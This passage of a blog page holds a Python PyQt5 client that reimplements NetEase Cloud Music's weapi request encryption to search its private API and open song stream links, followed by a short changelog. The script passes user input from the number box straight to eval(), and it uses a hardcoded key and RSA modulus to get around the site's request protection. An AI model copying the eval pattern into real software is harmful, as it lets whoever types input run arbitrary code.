class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">len_change</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        pad = <span class="number">16</span> - <span class="built_in">len</span>(text) % <span class="number">16</span></span><br><span class="line">        text = text + pad * <span class="built_in">chr</span>(pad)</span><br><span class="line">        text = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">self,text, key</span>):</span></span><br><span class="line">        iv = <span class="string">b&#x27;0102030405060708&#x27;</span></span><br><span class="line">        text = self.len_change(text)</span><br><span class="line">        cipher = AES.new(key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">        encrypted = cipher.encrypt(text)</span><br><span class="line">        encrypt = base64.b64encode(encrypted).decode()</span><br><span class="line">        <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        first_data = self.aes(text, <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span>)</span><br><span class="line">        second_data = self.aes(first_data, <span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> second_data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">c</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        e = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line">        f = <span class="string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line">        text = text[::-<span class="number">1</span>]</span><br><span class="line">        result = <span class="built_in">pow</span>(<span class="built_in">int</span>(binascii.hexlify(text.encode()), <span class="number">16</span>), <span class="built_in">int</span>(e, <span class="number">16</span>), <span class="built_in">int</span>(f, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">format</span>(result, <span class="string">&#x27;x&#x27;</span>).zfill(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_final_param</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        params = self.b(text, <span class="built_in">str</span>)</span><br><span class="line">        encSecKey = self.c(<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;params&#x27;</span>: params, <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self,song_search</span>):</span></span><br><span class="line">        song_url_list = []</span><br><span class="line">        song_name_list = []</span><br><span class="line">        song_num = <span class="number">0</span></span><br><span class="line">        d = &#123;<span class="string">&quot;hlpretag&quot;</span>: <span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>, <span class="string">&quot;hlposttag&quot;</span>: <span class="string">&quot;&lt;/span&gt;&quot;</span>, <span class="string">&quot;s&quot;</span>: song_search, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">             <span class="string">&quot;total&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;30&quot;</span>, <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        d = json.dumps(d)</span><br><span class="line">        random_param = self.get_random()</span><br><span class="line">        param = self.get_final_param(d, random_param)</span><br><span class="line">        song_list = self.get_music_list(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;搜索结果如下:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(song_list) &gt; <span class="number">0</span>:</span><br><span class="line">            song_list = json.loads(song_list)[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;songs&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(song_list):</span><br><span class="line">                item = json.dumps(item)</span><br><span class="line">                song_name = json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;：&quot;</span> + song_name)</span><br><span class="line">                d = &#123;<span class="string">&quot;ids&quot;</span>: <span class="string">&quot;[&quot;</span> + <span class="built_in">str</span>(json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;id&#x27;</span>]) + <span class="string">&quot;]&quot;</span>, <span class="string">&quot;level&quot;</span>: <span class="string">&quot;standard&quot;</span>, <span class="string">&quot;encodeType&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">                d = json.dumps(d)</span><br><span class="line">                param = self.get_final_param(d, random_param)</span><br><span class="line">                song_info = self.get_reply(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(song_info) &gt; <span class="number">0</span>:</span><br><span class="line">                    song_info = json.loads(song_info)</span><br><span class="line">                    song_url = json.dumps(song_info[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>], ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">                    song_name_list.append(song_name)</span><br><span class="line">                    song_url_list.append(song_url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该首歌曲解析失败，可能是因为歌曲格式问题&quot;</span>)</span><br><span class="line">                song_num = i+<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;一共搜索到&#123;&#125;个目标&quot;</span>.<span class="built_in">format</span>(song_num))</span><br><span class="line">            <span class="keyword">return</span> song_name_list,song_url_list</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWin</span>(<span class="params">QtWidgets.QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(MainWin, self).__init__(parent)</span><br><span class="line">        self.song_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.song_num = <span class="number">0</span></span><br><span class="line">        self.layout = QGridLayout()</span><br><span class="line">        self.setWindowFlags(Qt.SubWindow)</span><br><span class="line">        self.setupUI()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMusic</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* searchMusic &#x27;</span>)</span><br><span class="line">        self.song_name_list = []</span><br><span class="line">        self.song_url_list = []</span><br><span class="line">        self.song_num = <span class="number">0</span></span><br><span class="line">        self.song_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.song_search = self.searchBox.text()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_search) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先输入歌曲名称&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mus = Music()</span><br><span class="line">        self.song_name_list,self.song_url_list=mus.start(self.song_search)</span><br><span class="line">        <span class="keyword">for</span> song_name <span class="keyword">in</span> self.song_name_list:</span><br><span class="line">            self.song_num += <span class="number">1</span></span><br><span class="line">            self.song_result+=(<span class="built_in">str</span>(self.song_num)+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(song_name)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        self.song_result=self.song_result[:-<span class="number">1</span>]</span><br><span class="line">        self.resultText.setText(self.song_result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choiceMusic</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* choiceMusic &#x27;</span>)</span><br><span class="line">        self.song_choice = self.choiceBox.text()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_choice) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先输入编号&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.song_choice = <span class="built_in">eval</span>(self.song_choice)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_result) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先搜索歌曲&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.song_choice &gt; self.song_num:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;输入的编号有误&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.resultText.setText(<span class="string">&quot;开始播放:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.song_name_list[self.song_choice-<span class="number">1</span>]))</span><br><span class="line">        wb = webbrowser.get(<span class="string">&#x27;windows-default&#x27;</span>)</span><br><span class="line">        wb.<span class="built_in">open</span>(self.song_url_list[self.song_choice-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.resize(<span class="number">550</span>,<span class="number">450</span>)</span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(self)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">530</span>,<span class="number">430</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.groupBox.setStyleSheet(<span class="string">&quot;color:white&quot;</span>)</span><br><span class="line">        self.searchBox = QtWidgets.QLineEdit(self.groupBox)</span><br><span class="line">        self.searchBox.setGeometry(QtCore.QRect(<span class="number">105</span>,<span class="number">25</span>,<span class="number">160</span>,<span class="number">20</span>))</span><br><span class="line">        self.searchBox.setObjectName(<span class="string">&quot;searchBox&quot;</span>)</span><br><span class="line">        self.searchBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.choiceBox = QtWidgets.QLineEdit(self.groupBox)</span><br><span class="line">        self.choiceBox.setGeometry(QtCore.QRect(<span class="number">105</span>,<span class="number">315</span>,<span class="number">160</span>,<span class="number">20</span>))</span><br><span class="line">        self.choiceBox.setObjectName(<span class="string">&quot;choiceBox&quot;</span>)</span><br><span class="line">        self.choiceBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">60</span>,<span class="number">260</span>,<span class="number">240</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.resultText.setFont(QFont(<span class="string">&quot;微软雅黑&quot;</span>,<span class="number">10</span>,QFont.Bold))</span><br><span class="line">        self.resultText.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">30</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.label2 = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label2.setGeometry(QtCore.QRect(<span class="number">15</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">610</span>))</span><br><span class="line">        self.label2.setObjectName(<span class="string">&quot;laber2&quot;</span>)</span><br><span class="line">        self.searchButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.searchButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.searchButton.setObjectName(<span class="string">&quot;searchButton&quot;</span>)</span><br><span class="line">        self.choiceButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.choiceButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.choiceButton.setObjectName(<span class="string">&quot;choiceButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI()</span><br><span class="line">        self.searchButton.clicked.connect(self.searchMusic)</span><br><span class="line">        self.choiceButton.clicked.connect(self.choiceMusic)</span><br><span class="line">        self.quitButton.clicked.connect(self.quitWindows)</span><br><span class="line"></span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;网易云API&quot;</span>)</span><br><span class="line">        self.groupBox.setTitle(<span class="string">&quot;输入搜索的目标&quot;</span>)</span><br><span class="line">        self.label.setText(<span class="string">&quot;歌曲&amp;歌手&quot;</span>)</span><br><span class="line">        self.label2.setText(<span class="string">&quot;请输入编号&quot;</span>)</span><br><span class="line">        self.searchButton.setText(<span class="string">&quot;搜索&quot;</span>)</span><br><span class="line">        self.choiceButton.setText(<span class="string">&quot;播放&quot;</span>)</span><br><span class="line">        self.quitButton.setText(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    win = MainWin()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    win.setPalette(palette)</span><br><span class="line">    win.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.1</p>
</li>
<li><p>date：2022.5.20</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：<ul>
<li>全新的 UI 界面</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>本项目已相对完善，暂时不会更新了</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">130</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">95</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">1.7m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">26:01</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
